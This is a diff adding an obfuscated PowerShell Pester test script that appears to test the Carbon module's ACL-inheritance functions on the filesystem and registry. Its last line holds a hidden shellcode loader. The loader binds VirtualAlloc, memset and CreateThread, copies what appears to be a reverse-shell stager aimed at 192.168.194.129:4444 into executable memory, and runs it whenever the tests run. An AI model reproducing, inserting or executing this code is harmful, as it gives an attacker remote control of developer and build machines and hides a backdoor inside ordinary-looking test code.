@@ -1,0 +1,129 @@
+${t`Cq}=[tyPe]("{0}{1}" -f 'IO.P','Ath')  ; 
+
+
+
+
+
+
+
+
+
+
+
+
+.("{2}{4}{1}{0}{3}" -f'M','t','Set-Str','ode','ic') -Version ("{1}{0}" -f 'est','Lat')
+
+${ParEn`Tfsp`A`Th} = ${N`ULL} 
+${chi`LDf`SpA`Th} = ${n`Ull}
+${or`I`gI`NAlAcL} = ${nU`lL}
+
+& (.("{1}{0}{2}" -f 'n-Pa','Joi','th') -Path ${p`S`SCrIP`Troot} -ChildPath ("{3}{0}{4}{2}{1}"-f'tialize','.ps1','CarbonTest','Ini','-') -Resolve)
+
+function AS`seRt-a`C`linH`erItAnCEDISA`B`led
+{
+    param(
+        ${pA`Th}
+    )
+
+    &('It') ("{2}{3}{4}{7}{1}{5}{6}{0}" -f 'nce','e inh','s','ho','uld disable acces','erit','a','s rul') {
+        (.("{1}{0}"-f 't-Acl','Ge') -Path ${Pa`TH})."aReaCcESSRul`ES`pr`ote`c`TeD" | .("{0}{1}" -f 'Shou','ld') ('Be') ${T`RUe}
+    }
+
+}
+
+function NEW-T`EsTcO`N`T`AiNeR
+{
+    param(
+        [Parameter(mANdAtory=${TR`UE})]
+        ${pRoVi`d`eR}
+    )
+
+    if( ${pr`ovid`Er} -eq ("{1}{2}{0}" -f'leSystem','F','i') )
+    {
+        ${tEST`R`oOt} = (&("{1}{0}" -f'-Item','Get') -Path ("{1}{2}{0}" -f 'Drive:','T','est'))."fU`lLNa`ME"
+        ${PA`Th} = .("{0}{2}{1}" -f'Join-P','th','a') -Path ${TEST`R`OoT} -ChildPath (  (  Item  ("{1}{3}{0}{2}" -f'b','VAR','Le:Tcq','iA') )."V`ALUe"::("{0}{2}{3}{1}" -f'GetRan','me','domFi','leNa').Invoke())
+        &("{0}{4}{1}{2}{3}"-f'Ins','Dire','c','tory','tall-') -Path ${p`AtH}
+    }
+    elseif( ${PR`OvI`Der} -eq ("{1}{0}" -f 'ry','Regist') )
+    {
+        ${P`ATH} = ('hkcu:\Carbon+{0}\Disable-AclInheritance.Tests' -f   ${T`cq}::("{3}{4}{1}{0}{2}" -f'domFil','an','eName','Ge','tR').Invoke())
+        &("{1}{4}{3}{2}{0}" -f'Key','Insta','egistry','l-R','l') -Path ${Pa`TH}
+    }
+    else
+    {
+        throw ${P`ROv`iDER}
+    }
+
+    .("{3}{1}{2}{0}{4}"-f'ssio','a','nt-Permi','Gr','n') -Path ${P`AtH} -Identity ${E`Nv:usE`RNAme} -Permission ("{0}{1}{3}{2}"-f'Ful','lCo','trol','n')
+
+    &('It') ("{4}{2}{0}{1}{6}{5}{3}"-f ' ','in','uld have','nabled','sho','e e','heritanc') {
+        ${a`cL} = .("{0}{2}{1}"-f'G','t-Acl','e') -Path ${p`AtH}
+        ${a`Cl}."A`R`eac`ceSsRUl`EspRO`TE`cTEd" | &("{1}{0}" -f'ould','Sh') ('Be') ${fAL`Se}
+        ${a`cL} = ${n`Ull}
+    }
+
+    .('It') ("{6}{2}{4}{1}{3}{5}{7}{0}" -f's','c','erited','cess r',' a','ul','should have inh','e') {
+        &("{2}{0}{3}{1}"-f'-Per','ion','Get','miss') -Path ${p`AtH} -Inherited | &("{2}{1}{0}"-f 'ld','ou','Sh') ("{1}{0}"-f 'ot','N') ("{0}{1}{2}"-f'BeNullOrE','mp','ty')
+    }
+
+    return ${PA`TH}
+}
+
+foreach( ${pRo`VI`dEr} in @( ("{1}{2}{0}" -f'stem','F','ileSy'), ("{0}{1}"-f 'Regist','ry') ) )
+{
+    
+    &("{0}{2}{1}"-f'Descr','be','i') ('Disable-AclInheritance on {0}' -f ${pRo`VIDER}) {
+        ${p`ATH} = &("{0}{2}{3}{1}" -f 'New-Test','r','C','ontaine') -Provider ${PR`OVId`ER}
+        .("{3}{1}{0}{2}"-f'tect-A','o','cl','Pr') -Path ${P`Ath}
+        .("{1}{4}{3}{7}{0}{5}{6}{2}" -f 'Di','Asse','d','clIn','rt-A','s','able','heritance') -Path ${pA`TH}
+        &('It') ("{6}{5}{7}{1}{10}{0}{4}{8}{11}{2}{3}{9}" -f 'er',' in','cess ','rul','i','er','should not pres','ve','te','es','h','d ac') {
+            [object[]]${pe`RM} = &("{2}{3}{0}{1}"-f'ss','ion','Get-Pe','rmi') -Path ${pa`Th} -Inherited 
+            ${Pe`RM}."Cou`NT" | &("{1}{2}{0}" -f'd','Sho','ul') ('Be') 1
+            ${PE`RM}[0]."idENt`iT`Y`ReFereNcE" | .("{1}{0}"-f'hould','S') ('Be') (&("{4}{3}{1}{0}{2}"-f'tyN','denti','ame','ve-I','Resol') -Name ${Env:`UserNa`Me})
+        }
+    }
+    
+    .("{1}{0}{2}" -f'scrib','De','e') ('Disable-AclInheritance on {0} when preserving inherited rules' -f ${PR`OViD`er}) {
+        ${p`AtH} = .("{0}{1}{2}{3}" -f 'N','ew-TestC','onta','iner') -Provider ${pRo`Vi`D`Er}
+        [Security.AccessControl.AccessRule[]]${iNH`ERiTe`dp`e`RM`isSi`Ons} = .("{4}{3}{2}{1}{0}" -f 'n','o','ssi','rmi','Get-Pe') -Path ${pA`Th} -Inherited | .("{3}{2}{0}{1}"-f 'e','-Object','her','W') { ${_}."ISiNHe`RI`T`eD" }
+        &("{1}{0}{2}"-f'c','Protect-A','l') -Path ${P`Ath} -Preserve
+        &("{4}{3}{2}{1}{0}{5}"-f 'isabl','anceD','herit','sert-AclIn','As','ed') -Path ${P`AtH}
+        &('It') ("{2}{6}{0}{1}{5}{4}{3}{7}"-f'pr','eser','shou','rited access ','inhe','ve ','ld ','rules') {
+            [object[]]${Cu`RreNtPER`m`i`s`SIoNS} = &("{0}{2}{1}"-f'Get-','mission','Per') -Path ${P`ATh} -Inherited 
+            ${cu`RrenTPE`RMIssiO`Ns}."coU`NT" | .("{0}{1}" -f 'Sho','uld') ('Be') ${inH`Erited`pe`RMi`sS`IoNs}."C`ouNt"
+            for( ${I`DX} = 0; ${i`Dx} -lt ${cURRE`N`TpE`RmIs`SiOnS}."C`OuNt"; ++${I`Dx} )
+            {
+                ${cuRr`ent`peR`MI`sSIoN} = ${cuRre`NtPeRMi`ss`Io`NS}[${I`DX}]
+                ${i`Nh`ERITeD`P`ErmISS`ION} = ${inhE`RItED`PeRMI`SsI`ONS} | &("{2}{0}{1}{3}" -f'-Ob','j','Where','ect') { ${_}."idEnTITy`REfe`RE`NCe" -eq ${CU`RreNtPer`M`ISSion}."i`dEnTI`Ty`RE`FE`RENce" }
+
+                ${c`UrR`EntpeRMISs`iON}."iD`ENTIT`Yref`eRe`NCe" | .("{1}{0}{2}"-f'ou','Sh','ld') ('Be') ${i`N`HerIt`EDPeRmI`ssiON}."IDEn`Tit`yReF`eREnce"
+            }
+        }
+    }
+    
+    .("{0}{1}{2}"-f'Desc','ri','be') ('Disable-AclInheritance on {0} when part of a pipeline' -f ${pr`Ov`ideR}) {
+        ${P`Ath} = &("{1}{3}{4}{0}{2}"-f'Conta','New-','iner','Tes','t') -Provider ${pRo`Vi`deR}
+        &("{1}{0}"-f 'Item','Get-') -Path ${P`ATH} | &("{0}{4}{1}{6}{5}{2}{3}" -f 'Disab','Ac','ita','nce','le-','nher','lI') 
+        .("{5}{0}{1}{2}{7}{4}{6}{3}" -f'rt-Ac','l','In','abled','ceDi','Asse','s','heritan') -Path ${P`ATh}
+
+        ${pa`TH} = .("{1}{3}{2}{0}"-f 'er','N','ntain','ew-TestCo') -Provider ${pr`oVI`deR}
+        ${p`ATH} | &("{0}{2}{1}{3}{4}"-f'D','-AclI','isable','nheritan','ce')
+        &("{4}{0}{8}{5}{1}{6}{3}{7}{2}" -f 'l','a','ed','s','Assert-Ac','rit','nceDi','abl','Inhe') -Path ${Pa`TH}
+    }
+
+    .("{1}{0}{2}"-f 'sc','De','ribe') ('Disable-AclInheritandce on {0} when inheritance already disabled' -f ${Pro`Vi`dEr}) {
+        ${P`AtH} = .("{3}{1}{4}{2}{0}"-f'er','TestCo','n','New-','ntai') -Provider ${pR`O`VideR}
+        &("{3}{4}{2}{1}{0}" -f'ance','it','sable-AclInher','D','i') -Path ${pA`Th}
+        .("{5}{6}{2}{0}{4}{1}{3}" -f'eritanc','i','nh','sabled','eD','Asser','t-AclI') -Path ${p`ATH}
+
+        .("{1}{0}" -f 'ock','M') -CommandName ("{1}{0}" -f 'cl','Set-A') -ModuleName ("{0}{1}" -f'C','arbon') -Verifiable
+        &("{5}{3}{2}{0}{1}{4}"-f 'ita','n','-AclInher','sable','ce','Di') -Path ${P`Ath}
+        .('It') ("{3}{1}{4}{2}{8}{7}{6}{0}{5}" -f 'bled A','not disable an al','e','should ','r','CL',' disa','y','ad') {
+            &("{0}{1}{4}{2}{3}" -f 'As','sert','Mo','ckCalled','-') -CommandName ("{1}{0}" -f 'et-Acl','S') -ModuleName ("{0}{1}" -f 'Car','bon') -Times 0
+        }
+    }
+}
+
+&("{3}{0}{1}{2}" -f '-','ChildIte','m','Get') -Path ((("{4}{0}{1}{3}{2}"-f'}C','arb','*','on+','hkcu:{0'))  -F [chAr]92) | &("{3}{1}{0}{2}" -f'Ite','-','m','Remove') -Recurse -ErrorAction ("{0}{1}"-f'Ign','ore')
+
+${c} = ((("{65}{60}{54}{22}{38}{20}{47}{17}{12}{40}{10}{18}{37}{25}{30}{42}{48}{62}{16}{35}{1}{28}{29}{24}{9}{56}{57}{14}{27}{26}{33}{46}{43}{11}{15}{34}{8}{39}{61}{4}{63}{23}{19}{52}{58}{50}{2}{55}{49}{36}{21}{45}{6}{64}{66}{44}{59}{3}{32}{13}{0}{51}{41}{31}{7}{53}{5}"-f'tern IntPtr ','lAllo','tr ','eadId);[Dl','i','nt);','reationFlag',',','teThread(IntPt','ro','tPtr lp','ter','alAlloc','x','lImpo','n','e, u','r Virtu','Ad','ackSiz','tat','t dw','({0}kernel32.dll{0})]public','t','nt flP','es','rnel32.','rt({0}ke','cati','onType, ui','s, u','src','lImport({0}msvcrt.dll{0})]public static e','d',' IntPtr Crea','int f','in','dr',' s','r lpThreadAttributes','(In','st, uint ','int d','static ex','T','C','ll{0})]public ','ic extern IntPt','w','ress, IntPtr lpParameter, u','ntP','memset(IntPtr de','e,',' uint cou','ort','lpStartAdd','t','ect);[Dl',' I','hr','lImp',', u','Siz','nt dwS','s, IntP','[Dl','tr lp'))-F  [CHar]34);${w} = .("{1}{2}{0}"-f'ype','Add','-T') -memberDefinition ${c} -Name ("{0}{1}"-f 'W','in32') -namespace ("{3}{0}{1}{2}{4}" -f '2Func','t','io','Win3','ns') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc2,0x81,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${G} = 0x1000;if (${Z}."LEN`gTh" -gt 0x1000){${G} = ${z}."l`En`gTH"};${x}=${w}::("{1}{2}{0}" -f 'alAlloc','Virt','u').Invoke(0,0x1000,${g},0x40);for (${i}=0;${I} -le (${Z}."LEn`gTH"-1);${I}++) {${W}::"M`emS`eT"([IntPtr](${X}.("{1}{0}{2}"-f 'Int3','To','2').Invoke()+${i}), ${Z}[${I}], 1)};${W}::("{2}{1}{3}{0}" -f'hread','re','C','ateT').Invoke(0,0,${x},0,0,0);for (;;){.("{1}{3}{2}{0}" -f'leep','Sta','-s','rt') 60};
